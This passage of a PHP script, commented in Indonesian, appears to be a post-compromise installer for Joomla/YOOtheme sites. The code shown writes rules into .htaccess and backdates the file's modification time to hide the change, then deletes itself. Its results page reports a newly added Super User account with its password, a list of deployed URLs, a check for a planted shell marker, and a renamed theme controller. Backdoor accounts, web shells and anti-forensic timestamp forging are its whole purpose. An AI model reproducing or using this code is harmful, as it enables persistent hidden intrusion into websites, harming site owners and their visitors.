        // D. Tulis pakai metode apa pun yang masih hidup
        $used = write_file_any($htPath, $merged);
        if ($used === false) {
            $ht['msg'] = '[FAIL] tidak bisa menulis .htaccess: file_put_contents, fopen/fwrite, dan SplFileObject semuanya mati / permission ditolak.';
        } else {
            $ht['write'] = $used;
            $ht['size']  = strlen($merged);

            // Verifikasi tulis ulang
            $after = read_file_any($htPath);
            if ($after === false || strpos($after, $HT_MARK_BEGIN) !== 0) {
                $ht['msg'] = '[WARN] tulisan terkirim via ' . $used . ' tapi hasil baca ulang tidak sesuai.';
            } else {
                $ht['msg'] = '[OK] .htaccess digabung: rules baru di atas, isi lama (' . ($htExisted ? 'ada' : 'tidak ada') . ') di bawah.';
            }

            // E. Kunci timestamp: file lama -> mtime asli, file baru -> mtime root dir
            if (!function_exists('touch')) {
                $ht['mtime'] = 'touch() off';
            } else {
                if ($htExisted && $htOldTime) {
                    $want = $htOldTime;
                    $label = 'backdated ke ' . date('Y-m-d H:i', $want);
                } else {
                    $want = $rootTime ? $rootTime : time();
                    $label = 'samakan root dir ' . date('Y-m-d H:i', $want);
                }
                $touched = @touch($htPath, $want, $want);
                clearstatcache(true, $htPath);
                $actual = @filemtime($htPath);
                if ($touched && $actual === $want) {
                    $ht['mtime'] = $label;
                    if (!$htExisted) @touch($rootDir, $want, $want);
                } else {
                    // umum di shared hosting: file milik user lain, utime ditolak (EPERM)
                    $ht['mtime'] = '[WARN] touch gagal (file bukan milik user PHP?), mtime tetap '
                        . ($actual ? date('Y-m-d H:i', $actual) : '?');
                }
            }

            // F. Cek root masih 200 (kalau host tolak RewriteRule -> 500)
            $rootChk = http_request($base . '/', 8);
            $ht['http'] = $rootChk['status'] !== '' ? $rootChk['status'] : 'n/a';
            if ($ht['http'] === '500') {
                $ht['msg'] .= ' [WARN] root balas 500, host ini kemungkinan blok RewriteRule/Options. Hapus .htaccess segera.';
            }
        }
    }
}

$log[] = '[HTA] ' . ($ht['run'] ? $ht['mode'] : 'tidak dijalankan (gate)');
$log[] = '[HTA] ' . $ht['msg'];

// ==================== 5. SELF DELETE (log nyata, dijalankan sebelum render) ====================
$currentFile = __FILE__;
$selfDeleteMsg = '';
if (!function_exists('unlink')) {
    $selfDeleteMsg = "unlink() dimatikan (disable_functions), file installer dibiarkan.";
} elseif (@unlink($currentFile)) {
    $selfDeleteMsg = "File installer " . basename($currentFile) . " berhasil terhapus otomatis.";
} elseif (write_file_any($currentFile, '') !== false && @unlink($currentFile)) {
    $selfDeleteMsg = "File installer " . basename($currentFile) . " terhapus (fallback overwrite).";
} else {
    $selfDeleteMsg = "Gagal menghapus " . basename($currentFile) . " (periksa permission).";
}

// ==================== OUTPUT ====================
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Results</title>
    <style>
        body { background: #121212; color: #00ff66; font-family: monospace; padding: 20px; font-size: 13px; }
        h3 { color: #00ff66; border-bottom: 1px solid #00ff66; padding-bottom: 4px; margin-top: 24px; }
        textarea { width: 100%; height: 130px; background: #1e1e1e; color: #fff; border: 1px solid #333; padding: 10px; font-family: monospace; }
        button { background: #00ff66; color: #000; border: none; padding: 8px 16px; font-weight: bold; cursor: pointer; margin-top: 8px; }
        button:hover { background: #00cc52; }
        #notif { margin-left: 15px; color: #00ff66; font-weight: bold; display: inline-block; opacity: 0; transition: opacity 0.3s ease; }
        .box { background: #1a1a1a; border: 1px dashed #00ff66; padding: 10px; margin-top: 10px; max-height: 220px; overflow-y: auto; }
        .cred { background: #1a1a1a; border: 1px solid #00ff66; padding: 12px; margin-top: 10px; }
        .cred b { color: #fff; }
        .passrow { margin-top: 8px; }
        .passrow button { margin-top: 0; }
        #notifPass { margin-left: 12px; color: #00ff66; font-weight: bold; display: inline-block; opacity: 0; transition: opacity 0.3s ease; }
        a { color: #00d0ff; }
        .warn { color: #ffcc00; }
        .fail { color: #ff5555; }
    </style>
</head>
<body>
    <h2>Deployment Results</h2>

    <h3>Admin Access</h3>
    <div class="cred">
        <?php if ($admin): ?>
            <p>Username: <b><?php echo htmlspecialchars($admin['username']); ?></b></p>
            <p>Password: <b><?php echo htmlspecialchars($admin['password']); ?></b></p>
            <p>User ID: <b><?php echo htmlspecialchars((string) $admin['id']); ?></b> | Group: <b>8 (Super Users)</b></p>
            <div class="passrow">
                <input type="text" id="passVal" value="<?php echo htmlspecialchars($admin['password']); ?>" readonly style="width:340px;background:#1e1e1e;color:#fff;border:1px solid #333;padding:6px;">
                <button onclick="copyPass()">Copy Password</button>
                <span id="notifPass">Password dicopy!</span>
            </div>
        <?php elseif ($dbStatus === 'exists'): ?>
            <p class="warn">User <b>administrators</b> sudah ada di database. Password tidak diubah, pakai password yang sudah diketahui.</p>
        <?php else: ?>
            <p class="fail">Auto add user gagal / dilewati. Lihat status log di bawah.</p>
        <?php endif; ?>
        <p>Dashboard: <a href="<?php echo htmlspecialchars($base); ?>/administrator/" target="_blank"><?php echo htmlspecialchars($base); ?>/administrator/</a></p>
    </div>

    <h3>Deployed URLs (<?php echo count($results); ?>/<?php echo count($DEPLOY); ?>)</h3>
    <textarea id="urlList"><?php
        foreach ($results as $link) {
            echo htmlspecialchars($link) . "\n";
        }
    ?></textarea>
    <br>
    <div>
        <button onclick="copyUrls()">Salin Semua URL</button>
        <span id="notif">Berhasil dicopy!</span>
    </div>

    <h3>Timestamp Verification Log</h3>
    <div class="box">
        <?php
        if (!empty($statusLogs)) {
            foreach ($statusLogs as $l) {
                $cls = (strpos($l, '[FAIL]') === 0) ? 'fail' : '';
                echo "<div class=\"" . $cls . "\">" . htmlspecialchars($l) . "</div>";
            }
        } else {
            echo "<div>Tidak ada log deploy.</div>";
        }
        ?>
    </div>

    <h3>Rename YOOtheme Controller</h3>
    <div class="cred">
        <p>Source: <b><?php echo htmlspecialchars($rn['src']); ?></b></p>
        <p>Target: <b><?php echo htmlspecialchars($rn['dst']); ?></b></p>
        <p>Method: <b><?php echo htmlspecialchars($rn['method'] !== '' ? $rn['method'] : '-'); ?></b> |
           Path asli HTTP: <b><?php echo htmlspecialchars($rn['http'] !== '' ? $rn['http'] : '-'); ?></b></p>
        <p class="<?php echo (strpos($rn['msg'], '[OK]') === 0) ? '' : 'warn'; ?>"><?php echo htmlspecialchars($rn['msg']); ?></p>
    </div>

    <h3>.htaccess Gate (2 syarat wajib)</h3>
    <div class="cred">
        <p>Syarat 1 - Apache: <b class="<?php echo $gate['apache'] ? '' : 'fail'; ?>"><?php echo $gate['apache'] ? 'LOLOS' : 'GAGAL'; ?></b>
           (<?php echo htmlspecialchars($gate['apache_src']); ?>)</p>
        <p>Syarat 2 - Shell marker: <b class="<?php echo $gate['shell'] ? '' : 'fail'; ?>"><?php echo $gate['shell'] ? 'LOLOS' : 'GAGAL'; ?></b>
           (<?php echo htmlspecialchars($gate['shell_http']); ?>)</p>
        <p>Check URL: <b><?php echo htmlspecialchars($gate['shell_url']); ?></b></p>
        <p>Catatan: <?php echo htmlspecialchars($gate['shell_note']); ?></p>
        <p>Keputusan: <b class="<?php echo $gate['ok'] ? '' : 'fail'; ?>"><?php echo $gate['ok'] ? '.htaccess DIJALANKAN' : '.htaccess DI-SKIP'; ?></b></p>
    </div>

    <h3>.htaccess Status</h3>
    <div class="cred">
        <p>Source: <b><?php echo htmlspecialchars($ht['mode']); ?></b></p>
        <p>Target: <b><?php echo htmlspecialchars($ht['path']); ?></b> |
           Old file: <b><?php echo $ht['old'] ? 'ada (' . (int) $ht['size'] . ' bytes baru)' : 'tidak ada'; ?></b></p>
        <p>Write method: <b><?php echo htmlspecialchars($ht['write'] !== '' ? $ht['write'] : '-'); ?></b> |
           Timestamp: <b><?php echo htmlspecialchars($ht['mtime'] !== '' ? $ht['mtime'] : '-'); ?></b> |
           Root HTTP: <b><?php echo htmlspecialchars($ht['http'] !== '' ? $ht['http'] : '-'); ?></b></p>
        <p class="<?php echo (strpos($ht['msg'], '[OK]') === 0) ? '' : 'warn'; ?>"><?php echo htmlspecialchars($ht['msg']); ?></p>
    </div>

    <h3>Status Log</h3>
    <div class="box">
        <?php
        foreach ($log as $l) {
            echo "<div>" . htmlspecialchars($l) . "</div>";
        }
        ?>
    </div>

    <h3>Self-Delete Status</h3>
    <pre><?php echo htmlspecialchars($selfDeleteMsg); ?></pre>

    <script>
    function legacyCopy(value) {
        var ta = document.createElement("textarea");
        ta.value = value;
        ta.style.position = "fixed";
        ta.style.top = "-1000px";
        document.body.appendChild(ta);
        ta.select();
        var ok = false;
        try { ok = document.execCommand("copy"); } catch (e) { ok = false; }
        document.body.removeChild(ta);
        return ok;
    }

    function doCopy(value, notifId, text) {
        var notif = document.getElementById(notifId);
        var done = function() {
            notif.textContent = text;
            notif.style.opacity = "1";
            setTimeout(function() { notif.style.opacity = "0"; }, 2000);
        };
        if (navigator.clipboard && window.isSecureContext) {
            navigator.clipboard.writeText(value).then(done).catch(function() {
                if (legacyCopy(value)) done();
            });
        } else {
            if (legacyCopy(value)) done();
        }
    }

    function copyUrls() {
        var copyText = document.getElementById("urlList");
        copyText.select();
        copyText.setSelectionRange(0, 99999);
        doCopy(copyText.value, "notif", "Berhasil dicopy!");
    }

    function copyPass() {
        var el = document.getElementById("passVal");
        if (!el) return;
        doCopy(el.value, "notifPass", "Password dicopy!");
    }
    </script>
</body>
</html>
